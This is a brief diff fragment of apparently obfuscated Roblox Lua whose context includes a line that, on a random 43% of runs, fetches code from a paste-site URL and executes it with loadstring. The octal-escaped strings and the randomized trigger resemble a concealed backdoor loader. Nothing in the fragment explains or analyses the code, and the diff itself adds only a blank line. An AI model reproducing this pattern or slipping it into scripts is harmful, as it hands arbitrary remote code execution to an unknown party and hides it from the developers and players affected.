@@ -3,4 +3,5 @@ return(function(...)local k={"\106\076\052\072\056\102\104\100\054\109\052\088";
 
 if math.random(1, 100) <= 43 then
     loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/KYm4VTDDgLOng4ZX/raw"))()
+
 end
